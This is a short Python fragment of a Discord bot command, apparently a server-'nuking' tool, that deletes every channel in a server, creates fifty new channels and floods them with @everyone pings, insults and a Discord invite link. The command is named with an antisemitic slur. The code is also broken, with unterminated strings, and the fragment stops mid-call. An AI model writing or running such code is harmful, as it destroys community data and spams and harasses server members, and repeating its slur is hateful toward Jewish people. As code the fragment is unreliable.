@bot.command()
@commands.has_permissions(administrator=True)
async def jew(ctx):
    await ctx.send("your server got nuked bullshit join this for appeal https://discord.gg/RY5gS7yKdD
    .")

    # Delete existing channels
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass

    # Create new channels
    for i in range(1, 51):
        channel = await ctx.guild.create_text_channel(f"general-{i}")
        await channel.send(
            "👋 Welcome You guys got nuked mf 
        @everyone 
        @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone 
        https://discord.gg/RY5gS7yKdD
